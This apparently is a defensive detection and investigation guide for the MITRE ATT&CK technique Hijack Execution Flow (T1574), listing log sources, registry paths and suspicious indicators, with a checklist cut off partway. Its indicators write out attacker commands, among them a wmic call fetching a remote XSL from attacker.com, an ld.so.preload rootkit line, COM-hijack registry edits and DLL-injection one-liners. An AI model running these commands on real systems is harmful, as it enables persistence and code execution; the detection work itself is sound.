@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Hijack Execution Flow (T1574)</title>
+	<style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.6;
+            background-color: #f5f5f5;
+        }
+        h2 {
+            color: #2c3e50;
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 10px;
+            margin-top: 30px;
+        }
+        ul {
+            list-style: none;
+            padding: 0;
+        }
+        li {
+            margin: 10px 0;
+            padding: 8px;
+            background: white;
+            border-radius: 4px;
+            display: flex;
+            align-items: flex-start;
+        }
+        input[type="checkbox"] {
+            margin-right: 10px;
+            margin-top: 4px;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+        code {
+            background-color: #f4f4f4;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+	<h1>Hijack Execution Flow: <a href="https://attack.mitre.org/techniques/T1574/">T1574</a></h1>
+<h2>Detection Explanation</h2>
+<p>Hijack Execution Flow occurs when adversaries exploit the mechanisms operating systems use to locate and load code, libraries, or executables to execute their malicious payloads. By manipulating search paths, order of execution, or trusted application loading behaviors, attackers can cause legitimate programs to inadvertently load and execute attacker-controlled code. This technique leverages the inherent trust placed in application loading mechanisms, allowing malicious code to execute with the privileges and context of legitimate applications.</p>
+<p>Attackers use execution flow hijacking for multiple objectives including persistence, privilege escalation, and defense evasion. Common sub-techniques include DLL Search Order Hijacking (T1574.001) where attackers place malicious DLLs in locations searched before legitimate library paths, DLL Side-Loading (T1574.002) exploiting applications that load DLLs from their current directory, Dylib Hijacking (T1574.004) on macOS systems, Executable Installer File Permissions Weakness (T1574.005), Path Interception (T1574.007) through unquoted service paths or PATH environment manipulation, and Services File Permissions Weakness (T1574.010). This technique is particularly effective because the malicious code executes within the security context of trusted, signed applications, often bypassing application whitelisting and other security controls.</p>
+<p>The technique is frequently observed during initial access persistence establishment and privilege escalation phases. Attackers exploit applications that improperly validate library loading, use relative paths without verification, or have weak file permissions on executables and configuration files. Notable examples include abusing Windows DLL search order to load malicious libraries before legitimate ones, exploiting applications that load DLLs from their working directory, manipulating the PATH environment variable to redirect execution, and exploiting unquoted service paths in Windows services. Tools and malware families commonly leverage execution flow hijacking to maintain persistence while evading detection by security products.</p>
+<p>Detection requires monitoring for DLL loads from unusual locations, tracking changes to environment variables and search paths, identifying file writes to application directories by non-installer processes, and detecting execution of legitimate binaries loading unexpected libraries. Organizations must focus on unauthorized modifications to trusted application directories, anomalous library loading patterns, and the creation of files with names matching legitimate system libraries in user-writable locations.</p>
+<hr>
+<h2>Key Detection Indicators &amp; Areas to Investigate</h2>
+<h3>Summary of Indicators</h3>
+<ol>
+<li>DLL Search Order Hijacking - suspicious DLL loads from user-writable locations (T1574.001)</li>
+<li>DLL Side-Loading - legitimate signed applications loading malicious DLLs (T1574.002)</li>
+<li>PATH environment variable manipulation (T1574.007)</li>
+<li>Unquoted service paths exploitation (T1574.009)</li>
+<li>Weak file permissions on executables and services (T1574.010)</li>
+<li>Phantom DLL hijacking - loading non-existent DLLs</li>
+<li>COM hijacking through registry modifications (T1574.001)</li>
+<li>Application shimming and DLL redirection</li>
+<li>LD_PRELOAD and DYLD_INSERT_LIBRARIES on Linux/macOS (T1574.006)</li>
+<li>Execution proxying through trusted binaries loading malicious payloads</li>
+</ol>
+<hr>
+<h3>1. DLL Search Order Hijacking - Suspicious DLL Loads from User-Writable Locations (T1574.001)</h3>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 7 (Image Loaded) - DLL loads with suspicious <code>ImageLoaded</code> paths
+<ul>
+<li>Monitor for DLLs loaded from: <code>%TEMP%</code>, <code>%APPDATA%</code>, <code>%LOCALAPPDATA%</code>, <code>C:\Users\</code>, <code>C:\ProgramData\</code></li>
+<li>Check <code>Signed</code> and <code>SignatureStatus</code> fields for unsigned or invalid signatures</li>
+</ul>
+</li>
+<li>Event ID 11 (File Create) - DLL files created in application directories or system paths</li>
+<li>Event ID 1 (Process Creation) - Processes loading from unexpected working directories</li>
+</ul>
+<p><strong>Windows Event Logs:</strong></p>
+<ul>
+<li>Event ID 4688 (Process Creation) - Check working directory and image path fields</li>
+<li>Event ID 4663 (File Access) - Write access to Program Files or Windows\System32 directories</li>
+</ul>
+<p><strong>EDR/File Monitoring:</strong></p>
+<ul>
+<li>DLL writes to directories in the Windows DLL search order</li>
+<li>Library loads from current working directory before System32</li>
+<li>DLL placement in application installation directories</li>
+</ul>
+<p><strong>Focus on:</strong></p>
+<ul>
+<li>System processes loading DLLs from non-system locations</li>
+<li>Recently created DLLs (creation time within last 7 days) loaded by trusted applications</li>
+<li>DLLs with names matching legitimate Windows libraries but from wrong paths</li>
+<li>Applications loading multiple DLLs from temporary directories</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li><code>explorer.exe</code> loading DLLs from <code>C:\Users\Public\</code> or <code>%TEMP%</code></li>
+<li>Legitimate applications loading: <code>version.dll</code>, <code>wininet.dll</code>, <code>kernel32.dll</code> from application directory</li>
+<li>DLL names: <code>wlbsctrl.dll</code>, <code>TSMSISrv.dll</code>, <code>WLBSCTRL.dll</code> (commonly hijacked)</li>
+<li>Office applications loading DLLs from <code>%APPDATA%\Microsoft\</code> or user profile directories</li>
+<li>Signed executables (Adobe, Microsoft) loading unsigned DLLs from current directory</li>
+<li>System utilities loading DLLs from writable paths: <code>C:\Windows\Tasks\</code>, <code>C:\Windows\Temp\</code></li>
+<li>Browser processes loading DLLs from Downloads folder</li>
+<li>PowerShell or cmd.exe loading non-standard DLLs from script execution paths</li>
+<li>DLL hijacking through Windows Accessibility features loading from user directories</li>
+</ul>
+<hr>
+<h3>2. DLL Side-Loading - Legitimate Signed Applications Loading Malicious DLLs (T1574.002)</h3>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 7 (Image Loaded) - Correlation between signed <code>Image</code> and unsigned <code>ImageLoaded</code>
+<ul>
+<li>Trusted executables (Microsoft, Adobe, Symantec signatures) loading unsigned DLLs</li>
+</ul>
+</li>
+<li>Event ID 1 (Process Creation) - Execution of legitimate binaries from unusual locations</li>
+<li>Event ID 11 (File Create) - DLL drops alongside legitimate executable copies</li>
+</ul>
+<p><strong>Windows Event Logs:</strong></p>
+<ul>
+<li>Event ID 8002 (Application Experience - Compatibility Installer) - Application compatibility shim usage</li>
+<li>Event ID 4688 (Process Creation) - Legitimate application execution from non-standard paths</li>
+</ul>
+<p><strong>Application Logs:</strong></p>
+<ul>
+<li>Application errors indicating failed DLL loads or unexpected library versions</li>
+<li>Code Integrity logs (Event ID 3033/3063) showing unsigned module loads</li>
+</ul>
+<p><strong>Look for:</strong></p>
+<ul>
+<li>Copies of legitimate executables in user-writable directories</li>
+<li>Legitimate applications running from <code>%TEMP%</code>, <code>%APPDATA%</code>, <code>C:\ProgramData\</code></li>
+<li>Trusted binaries loading DLLs with suspicious export functions</li>
+<li>DLL side-loading via applications with known vulnerabilities</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li><strong>Common side-loading targets:</strong>
+<ul>
+<li><code>GUP.exe</code> (Notepad++ updater) loading <code>libcurl.dll</code></li>
+<li><code>OneDriveStandaloneUpdater.exe</code> loading <code>version.dll</code></li>
+<li><code>Werfault.exe</code> (Windows Error Reporting) loading <code>faultrep.dll</code></li>
+<li><code>chrome_frame_helper.exe</code> loading <code>goopdate.dll</code></li>
+<li>Symantec/McAfee executables loading hijacked DLLs</li>
+</ul>
+</li>
+<li>Legitimate executables copied to: <code>C:\ProgramData\</code>, <code>C:\Users\Public\</code>, <code>%APPDATA%</code></li>
+<li>Executables with valid signatures loading DLLs with mismatched or no signatures</li>
+<li>Application directories containing both legitimate EXE and malicious DLL pairs</li>
+<li>Remote administration tools (RDP, VNC) loading unexpected libraries</li>
+<li>Scheduled tasks executing legitimate binaries from temporary locations</li>
+<li>Persistence via side-loaded DLLs: Registry Run keys pointing to copied legitimate executables</li>
+<li>Foreign language applications or utilities rarely used in the environment suddenly executed</li>
+</ul>
+<hr>
+<h3>3. PATH Environment Variable Manipulation (T1574.007)</h3>
+<p><strong>Registry Monitoring:</strong></p>
+<ul>
+<li><code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\Path</code> - System PATH</li>
+<li><code>HKCU\Environment\Path</code> - User PATH</li>
+</ul>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 13 (Registry Value Set) - Modifications to PATH environment variables</li>
+<li>Event ID 1 (Process Creation) - Check <code>CommandLine</code> for PATH modifications via <code>setx</code> or <code>reg add</code></li>
+<li>Event ID 11 (File Create) - Executables created in directories added to PATH</li>
+</ul>
+<p><strong>Windows Event Logs:</strong></p>
+<ul>
+<li>Event ID 4657 (Registry Value Modified) - PATH registry changes</li>
+<li>Event ID 4688 (Process Creation) - Commands modifying environment variables</li>
+</ul>
+<p><strong>PowerShell Logs:</strong></p>
+<ul>
+<li>Event ID 4104 (Script Block Logging) - Scripts modifying <code>$env:PATH</code> or using <code>[Environment]::SetEnvironmentVariable</code></li>
+</ul>
+<p><strong>Focus on:</strong></p>
+<ul>
+<li>User-writable directories prepended to PATH (searched before system directories)</li>
+<li>Addition of temporary directories, network shares, or unusual paths</li>
+<li>PATH modifications by non-administrative users</li>
+<li>PATH changes correlating with malicious executable placement</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li>Commands: <code>setx PATH &quot;%TEMP%;%PATH%&quot;</code>, <code>reg add HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment /v Path</code></li>
+<li>User directories added to beginning of system PATH: <code>C:\Users\username\AppData\Local\;</code></li>
+<li>Network paths or UNC paths in PATH: <code>\\attacker-server\share;%PATH%</code></li>
+<li>Addition of <code>C:\ProgramData\</code>, <code>C:\Users\Public\</code>, or hidden directories</li>
+<li>PATH modifications followed by execution of common utility names: <code>cmd.exe</code>, <code>powershell.exe</code>, <code>net.exe</code></li>
+<li>Executables with system utility names placed in PATH directories: <code>%TEMP%\cmd.exe</code>, <code>%APPDATA%\powershell.exe</code></li>
+<li>PowerShell: <code>[Environment]::SetEnvironmentVariable(&quot;PATH&quot;, &quot;C:\Evil;$env:PATH&quot;, &quot;Machine&quot;)</code></li>
+<li>Batch scripts or installers modifying PATH without legitimate software installation context</li>
+<li>PATH entries pointing to temporary directories that persist after reboot</li>
+</ul>
+<hr>
+<h3>4. Unquoted Service Paths Exploitation (T1574.009)</h3>
+<p><strong>Registry Monitoring:</strong></p>
+<ul>
+<li><code>HKLM\SYSTEM\CurrentControlSet\Services\*\ImagePath</code> - Service executable paths</li>
+</ul>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 13 (Registry Value Set) - Service ImagePath modifications</li>
+<li>Event ID 11 (File Create) - Executable creation in paths matching unquoted service path fragments</li>
+<li>Event ID 1 (Process Creation) - Execution from intermediate service path locations</li>
+</ul>
+<p><strong>Windows Event Logs:</strong></p>
+<ul>
+<li>Event ID 7045 (Service Installed) - New service with unquoted path</li>
+<li>Event ID 7040 (Service Start Type Changed) - Service configuration modifications</li>
+<li>Event ID 4688 (Process Creation) - Parent process <code>services.exe</code> spawning from unexpected paths</li>
+<li>Event ID 4697 (Service Installed) - Service installation with unquoted ImagePath</li>
+</ul>
+<p><strong>Service Enumeration:</strong></p>
+<ul>
+<li>PowerShell: <code>Get-WmiObject Win32_Service | Where {$_.PathName -notmatch '^&quot;.*&quot;' -and $_.PathName -match ' '}</code></li>
+<li>Command: <code>wmic service get name,pathname | findstr /i /v &quot;C:\Windows&quot; | findstr /i /v &quot;&quot;&quot;</code></li>
+</ul>
+<p><strong>Look for:</strong></p>
+<ul>
+<li>Service paths containing spaces without quotes</li>
+<li>Executables created at intermediate path positions</li>
+<li>Service paths under <code>C:\Program Files\</code> without quotes</li>
+<li>Service modification or creation by non-SYSTEM accounts</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li><strong>Vulnerable service path examples:</strong>
+<ul>
+<li><code>C:\Program Files\Vendor Name\Application\service.exe</code> → Attacker creates <code>C:\Program.exe</code></li>
+<li><code>C:\Program Files (x86)\Common Files\Service\app.exe</code> → Attacker creates <code>C:\Program.exe</code> or <code>C:\Program Files (x86)\Common.exe</code></li>
+</ul>
+</li>
+<li>File creation: <code>C:\Program.exe</code>, <code>C:\Program Files\Vendor.exe</code>, <code>C:\Program Files (x86)\Common.exe</code></li>
+<li>Service configuration changes to introduce spaces in paths</li>
+<li>Executables with generic names (<code>Program.exe</code>, <code>Common.exe</code>, <code>Vendor.exe</code>) at root or Program Files level</li>
+<li>Services with ImagePath modifications removing quotes</li>
+<li>Event ID 7045 showing service installation with unquoted paths by non-admin users</li>
+<li>Service start followed by execution from unintended path location</li>
+<li>Privilege escalation: Service running as SYSTEM executing attacker-placed executable</li>
+</ul>
+<hr>
+<h3>5. Weak File Permissions on Executables and Services (T1574.010)</h3>
+<p><strong>File System Monitoring:</strong></p>
+<ul>
+<li>ACL changes on executable files and service binaries</li>
+<li>Write access to Program Files, Windows\System32, or service executable paths</li>
+</ul>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 11 (File Create) - Overwrites or modifications to service executables</li>
+<li>Event ID 2 (File Creation Time Changed) - Timestomping on legitimate executables</li>
+<li>Event ID 1 (Process Creation) - Modified service executables launching</li>
+</ul>
+<p><strong>Windows Event Logs:</strong></p>
+<ul>
+<li>Event ID 4663 (File Access) - Write/Delete access to system executables</li>
+<li>Event ID 4670 (Permissions Changed) - ACL modifications on executable files</li>
+<li>Event ID 4688 (Process Creation) - Execution of recently modified system binaries</li>
+</ul>
+<p><strong>PowerShell/Command Line:</strong></p>
+<ul>
+<li><code>icacls</code> or <code>Get-Acl</code> showing weak permissions: Everyone (F), Users (W), Authenticated Users (M)</li>
+<li>Permission enumeration: <code>accesschk.exe -wvu &quot;C:\Program Files&quot;</code>, <code>Get-Acl | Where {$_.Access -match &quot;Users.*Allow.*Write&quot;}</code></li>
+</ul>
+<p><strong>Focus on:</strong></p>
+<ul>
+<li>Executables in system directories with write permissions for standard users</li>
+<li>Service binaries with weak ACLs allowing modification</li>
+<li>Installer directories with overly permissive permissions persisting after installation</li>
+<li>Configuration files controlling executable behavior with write access</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li>Service executables with ACLs allowing: <code>BUILTIN\Users (W)</code>, <code>Everyone (F)</code>, <code>Authenticated Users (M)</code></li>
+<li>Executables in <code>C:\Windows\System32\</code> or <code>C:\Program Files\</code> modified by non-SYSTEM accounts</li>
+<li>File modification timestamps on critical system binaries changed recently</li>
+<li>Executables showing write access in permission audits: <code>icacls &quot;C:\Program Files\App\service.exe&quot; | findstr Users</code></li>
+<li>Service executable modifications correlating with service restarts</li>
+<li>Overwritten legitimate executables retaining original file names but different hashes</li>
+<li>Changes to binaries in Windows\System32: <code>svchost.exe</code>, <code>lsass.exe</code>, <code>services.exe</code> (extremely rare)</li>
+<li>Application executables replaced with malicious versions maintaining original file metadata</li>
+<li>Executable signing status changing from signed to unsigned</li>
+<li>Modified executables with creation dates predating actual file modification times (timestomping)</li>
+</ul>
+<hr>
+<h3>6. Phantom DLL Hijacking - Loading Non-Existent DLLs</h3>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 7 (Image Loaded) - Failed DLL loads (requires verbose logging)</li>
+<li>Event ID 11 (File Create) - DLL creation in paths where applications previously failed to load libraries</li>
+</ul>
+<p><strong>EDR/Process Monitoring:</strong></p>
+<ul>
+<li>API monitoring: <code>LoadLibrary()</code>, <code>LoadLibraryEx()</code> calls returning errors</li>
+<li>DLL load failures followed by successful loads from unexpected locations</li>
+</ul>
+<p><strong>Application Logs:</strong></p>
+<ul>
+<li>Application errors showing DLL load failures (Event ID 1000, 1001)</li>
+<li>Side-by-Side Configuration errors (Event ID 33, 34, 35)</li>
+</ul>
+<p><strong>Tools:</strong></p>
+<ul>
+<li>Process Monitor: Filter for <code>NAME NOT FOUND</code> or <code>PATH NOT FOUND</code> on DLL operations</li>
+<li>Dependency Walker or similar tools identifying missing DLLs</li>
+</ul>
+<p><strong>Look for:</strong></p>
+<ul>
+<li>Applications attempting to load DLLs that don’t exist in standard Windows installations</li>
+<li>Previously non-existent DLLs suddenly appearing in application directories</li>
+<li>DLL names in load attempts that match common Windows libraries but from wrong paths</li>
+<li>Applications loading optional/non-critical DLLs from hijackable locations</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li>Common phantom DLLs: <code>CRYPTSP.dll</code>, <code>CRYPTBASE.dll</code>, <code>WINMM.dll</code>, <code>WTSAPI32.dll</code>, <code>SAMLIB.dll</code></li>
+<li>Application attempting to load DLL → failure → DLL created in application directory → successful load</li>
+<li>Legitimate applications loading newly created DLLs matching previously failed load attempts</li>
+<li>DLL files created in application installation directories after application execution begins</li>
+<li>Applications in Program Files loading optional DLLs from current working directory</li>
+<li>Services attempting to load non-existent DLLs from Windows\System32, then loading from elsewhere</li>
+<li>Browser extensions or plugins loading phantom DLLs from user profile directories</li>
+<li>Microsoft Office applications loading previously non-existent DLLs from Office installation path</li>
+<li>Executables showing dependency on DLLs not typically required by that application type</li>
+</ul>
+<hr>
+<h3>7. COM Hijacking Through Registry Modifications (T1574.001)</h3>
+<p><strong>Registry Monitoring:</strong></p>
+<ul>
+<li><code>HKCU\Software\Classes\CLSID\{GUID}\InprocServer32</code> - User-level COM object hijacking</li>
+<li><code>HKCU\Software\Classes\CLSID\{GUID}\LocalServer32</code> - Local COM server hijacking</li>
+<li><code>HKLM\Software\Classes\CLSID\{GUID}\InprocServer32</code> - System-level COM hijacking</li>
+<li><code>HKCU\Software\Classes\*\ShellEx\*</code> - Shell extension handler hijacking</li>
+</ul>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 13 (Registry Value Set) - CLSID or InprocServer32 value modifications</li>
+<li>Event ID 12 (Registry Object Created) - New CLSID entries created</li>
+<li>Event ID 7 (Image Loaded) - DLL loads from COM object instantiation</li>
+</ul>
+<p><strong>Windows Event Logs:</strong></p>
+<ul>
+<li>Event ID 4657 (Registry Value Modified) - CLSID registry changes</li>
+<li>Event ID 4688 (Process Creation) - COM surrogate processes (<code>dllhost.exe</code>) executing unusual DLLs</li>
+</ul>
+<p><strong>PowerShell Logs:</strong></p>
+<ul>
+<li>Event ID 4104 (Script Block Logging) - Scripts enumerating or modifying CLSID entries</li>
+</ul>
+<p><strong>Focus on:</strong></p>
+<ul>
+<li>User-level CLSID entries overriding system-level COM objects</li>
+<li>InprocServer32 or LocalServer32 paths pointing to unusual locations</li>
+<li>COM objects pointing to executables/DLLs in temporary or user-writable directories</li>
+<li>Modifications to commonly used COM objects (Microsoft Office, Windows Explorer extensions)</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li>CLSID InprocServer32 paths pointing to: <code>%TEMP%</code>, <code>%APPDATA%</code>, <code>C:\ProgramData\</code>, user profile directories</li>
+<li>COM object modifications for persistence: <code>{BCDE0395-E52F-467C-8E3D-C4579291692E}</code> (Task Scheduler), <code>{20D04FE0-3AEA-1069-A2D8-08002B30309D}</code> (My Computer)</li>
+<li>New user-level CLSID entries shadowing legitimate system CLSIDs</li>
+<li>COM hijacking of Office add-ins or shell extensions</li>
+<li>Registry changes: <code>reg add HKCU\Software\Classes\CLSID\{...}\InprocServer32 /ve /d &quot;C:\Evil\malicious.dll&quot;</code></li>
+<li>PowerShell: <code>New-Item -Path &quot;HKCU:\Software\Classes\CLSID\{GUID}&quot; -Force</code></li>
+<li><code>dllhost.exe</code> or <code>rundll32.exe</code> loading DLLs from non-standard locations via COM</li>
+<li>COM objects with TreatAs or ProgID keys redirecting to malicious implementations</li>
+<li>Shell extension handlers pointing to attacker-controlled DLLs</li>
+<li>COM object modifications correlating with persistence establishment or privilege escalation</li>
+<li>Explorer context menu handlers loading malicious DLLs</li>
+</ul>
+<hr>
+<h3>8. Application Shimming and DLL Redirection</h3>
+<p><strong>Registry Monitoring:</strong></p>
+<ul>
+<li><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom</code></li>
+<li><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB</code></li>
+</ul>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 13 (Registry Value Set) - AppCompat registry modifications</li>
+<li>Event ID 11 (File Create) - SDB file creation in <code>C:\Windows\AppPatch\Custom\</code></li>
+<li>Event ID 1 (Process Creation) - <code>sdbinst.exe</code> execution installing shim databases</li>
+</ul>
+<p><strong>Windows Event Logs:</strong></p>
+<ul>
+<li>Event ID 8002 (Application Experience) - Shim database installation</li>
+<li>Event ID 8003 (Application Experience) - Application shimmed at runtime</li>
+<li>Event ID 4688 (Process Creation) - <code>sdbinst.exe</code> command line showing custom SDB installation</li>
+</ul>
+<p><strong>File System:</strong></p>
+<ul>
+<li>Files in <code>C:\Windows\AppPatch\Custom\</code> - Custom shim databases</li>
+<li>Files in <code>%TEMP%</code> or user directories with <code>.sdb</code> extension</li>
+</ul>
+<p><strong>Focus on:</strong></p>
+<ul>
+<li>Installation of custom shim databases by non-administrative users</li>
+<li>Shim databases redirecting DLL loads or hooking API calls</li>
+<li>Application compatibility fixes applied to unexpected executables</li>
+<li>Shim installations without corresponding legitimate software deployment</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li>Commands: <code>sdbinst.exe -q C:\Users\Public\malicious.sdb</code>, <code>sdbinst.exe /install custom_shim.sdb</code></li>
+<li>Shim databases applying redirects or hooks to: <code>cmd.exe</code>, <code>powershell.exe</code>, system utilities</li>
+<li>SDB files with suspicious names or in unusual locations being installed</li>
+<li>Application compatibility fixes applied to LOLBins (Living Off the Land Binaries)</li>
+<li>Shim database entries modifying LoadLibrary behavior or DLL search paths</li>
+<li>Registry entries in InstalledSDB pointing to user-writable directories</li>
+<li>Event ID 8002/8003 showing shimming of critical system binaries</li>
+<li>Shim databases containing <code>RedirectEXE</code>, <code>InjectDll</code>, or <code>RedirectDLL</code> fixes</li>
+<li>DLL redirection manifests (<code>.manifest</code>, <code>.local</code> files) placed alongside executables</li>
+<li>WinSxS side-by-side assembly hijacking through policy modifications</li>
+</ul>
+<hr>
+<h3>9. LD_PRELOAD and DYLD_INSERT_LIBRARIES on Linux/macOS (T1574.006)</h3>
+<p><strong>Linux - Environment Variables:</strong></p>
+<ul>
+<li><code>/etc/environment</code> - System-wide environment variables</li>
+<li><code>/etc/profile</code>, <code>/etc/bash.bashrc</code> - Shell initialization scripts</li>
+<li><code>~/.bashrc</code>, <code>~/.bash_profile</code>, <code>~/.profile</code> - User shell configurations</li>
+</ul>
+<p><strong>Linux - Audit Logs (auditd):</strong></p>
+<ul>
+<li>Monitor file writes to: <code>/etc/ld.so.preload</code>, <code>/etc/ld.so.conf.d/</code></li>
+<li>Track environment variable modifications: <code>LD_PRELOAD</code>, <code>LD_LIBRARY_PATH</code></li>
+<li>Process execution with modified library paths</li>
+</ul>
+<p><strong>macOS - LaunchAgents/LaunchDaemons:</strong></p>
+<ul>
+<li>Environment variable injection in <code>~/Library/LaunchAgents/</code>, <code>/Library/LaunchAgents/</code></li>
+<li><code>DYLD_INSERT_LIBRARIES</code>, <code>DYLD_LIBRARY_PATH</code> in plist files</li>
+</ul>
+<p><strong>Command Execution:</strong></p>
+<ul>
+<li>Bash history showing: <code>export LD_PRELOAD=/path/to/malicious.so</code></li>
+<li>Commands: <code>LD_PRELOAD=/tmp/evil.so /usr/bin/program</code></li>
+</ul>
+<p><strong>Look for:</strong></p>
+<ul>
+<li>Modifications to <code>/etc/ld.so.preload</code> outside package management</li>
+<li>Shared objects (<code>.so</code> files) in temporary directories or user-writable locations</li>
+<li>Environment variable modifications in shell startup scripts</li>
+<li>Library preloading of critical system binaries (sudo, ssh, login)</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li><code>/etc/ld.so.preload</code> containing entries: <code>/tmp/evil.so</code>, <code>/home/user/.hidden/malicious.so</code></li>
+<li>Commands: <code>echo &quot;/tmp/rootkit.so&quot; &gt;&gt; /etc/ld.so.preload</code></li>
+<li>Bash history: <code>export LD_PRELOAD=/dev/shm/inject.so &amp;&amp; sudo command</code></li>
+<li>Shared objects with suspicious names in: <code>/tmp/</code>, <code>/dev/shm/</code>, user home directories</li>
+<li>LD_PRELOAD usage targeting: <code>sshd</code>, <code>sudo</code>, <code>passwd</code>, authentication binaries</li>
+<li>macOS: DYLD environment variables in LaunchAgent plist files pointing to unsigned libraries</li>
+<li>Process execution showing library loads from unexpected paths via <code>lsof</code> or <code>pmap</code></li>
+<li>Persistence via shell startup scripts: <code>.bashrc</code>, <code>.zshrc</code> containing LD_PRELOAD exports</li>
+<li>Shared objects without proper ELF headers or suspicious export functions</li>
+<li>Library injection into system processes or daemons during startup</li>
+</ul>
+<hr>
+<h3>10. Execution Proxying Through Trusted Binaries Loading Malicious Payloads</h3>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 1 (Process Creation) - Trusted binaries executed from unusual locations or with suspicious parameters</li>
+<li>Event ID 7 (Image Loaded) - Trusted executables loading unexpected DLLs or plugins</li>
+<li>Event ID 11 (File Create) - Plugin or configuration files created for trusted applications</li>
+</ul>
+<p><strong>Windows Event Logs:</strong></p>
+<ul>
+<li>Event ID 4688 (Process Creation) - Legitimate signed binaries with unusual command lines</li>
+<li>Event ID 4663 (File Access) - Write access to plugin directories of trusted applications</li>
+</ul>
+<p><strong>Application Logs:</strong></p>
+<ul>
+<li>Application-specific logs showing plugin loading or extension execution</li>
+</ul>
+<p><strong>Focus on:</strong></p>
+<ul>
+<li>Signed Microsoft binaries executing attacker payloads (LOLBins with DLL loading)</li>
+<li>Browser processes loading malicious extensions or plugins</li>
+<li>Scripting host processes (wscript.exe, mshta.exe) loading attacker content</li>
+<li>Trusted utilities loading libraries or scripts from unexpected locations</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li><strong>Microsoft signed binaries used for execution proxying:</strong>
+<ul>
+<li><code>rundll32.exe</code> loading DLLs from user-writable locations</li>
+<li><code>regsvr32.exe</code> registering DLLs from <code>%TEMP%</code> or network paths</li>
+<li><code>mshta.exe</code> executing HTA files with embedded scripts</li>
+<li><code>wmic.exe</code> loading XSL scripts: <code>wmic os get /format:&quot;https://attacker.com/evil.xsl&quot;</code></li>
+<li><code>mavinject.exe</code> injecting DLLs: <code>mavinject.exe PID /INJECTRUNNING C:\path\to\malicious.dll</code></li>
+<li><code>SyncAppvPublishingServer.exe</code> executing PowerShell: <code>SyncAppvPublishingServer.exe &quot;n;calc&quot;</code></li>
+</ul>
+</li>
+<li>Browser extension loading from: <code>%APPDATA%\Local\Google\Chrome\User Data\Default\Extensions\</code></li>
+<li>Adobe Reader plugins in user directories: <code>%APPDATA%\Adobe\Acrobat\Plugins\</code></li>
+<li>Microsoft Office add-ins loading from unexpected locations</li>
+<li><code>odbcconf.exe</code> loading malicious DLLs: <code>odbcconf.exe /a {REGSVR C:\malicious.dll}</code></li>
+<li><code>control.exe</code> loading CPL files from user directories: <code>control.exe C:\Users\Public\evil.cpl</code></li>
+<li>Execution through DLL exports: <code>rundll32.exe payload.dll,EntryPoint</code></li>
+<li>Plugin directories for media players, PDF readers, or Office applications containing recently created files</li>
+<li>Configuration file manipulation redirecting execution to attacker payloads</li>
+</ul>
+<hr>
+<h1>Hijack Execution Flow (T1574) Investigation Checklist</h1>
+
+<h2>1. DLL Search Order Hijacking Detection</h2>
+<ul>
+  <li><label><input type="checkbox"> Review Sysmon Event ID 7 for DLL loads from: <code>%TEMP%</code>, <code>%APPDATA%</code>, <code>%LOCALAPPDATA%</code>, <code>C:\Users\</code>, <code>C:\ProgramData\</code></label></li>
+  <li><label><input type="checkbox"> Check for system processes loading DLLs from non-system locations (unsigned or invalid signatures)</label></li>
+  <li><label><input type="checkbox"> Search Sysmon Event ID 11 for DLL creation in application directories or system paths</label></li>
+  <li><label><input type="checkbox"> Identify recently created DLLs (within 7 days) loaded by trusted applications</label></li>
+  <li><label><input type="checkbox"> Look for DLLs with names matching legitimate Windows libraries (version.dll, wininet.dll, kernel32.dll) from non-standard paths</label></li>
+</ul>
+
+<h2>2. DLL Side-Loading Analysis</h2>
+<ul>
+  <li><label><input type="checkbox"> Check Sysmon Event ID 7 for signed executables (Microsoft, Adobe, Symantec) loading unsigned DLLs</label></li>
+  <li><label><input type="checkbox"> Search Event ID 4688/Sysmon Event ID 1 for legitimate applications running from <code>%TEMP%</code>, <code>%APPDATA%</code>, <code>C:\ProgramData\</code></label></li>
+  <li><label><input type="checkbox"> Identify copies of legitimate executables (GUP.exe, OneDriveStandaloneUpdater.exe, Werfault.exe) in user-writable directories</label></li>
+  <li><label><input type="checkbox"> Review Sysmon Event ID 11 for DLL drops alongside copied legitimate executables</label></li>
+  <li><label><input type="checkbox"> Look for legitimate binaries with valid signatures loading DLLs with mismatched or no signatures</label></li>
+</ul>
+
+<h2>3. PATH Environment Variable Manipulation</h2>
+<ul>
+  <li><label><input type="checkbox"> Check Sysmon Event ID 13 for modifications to: <code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\Path</code></label></li>
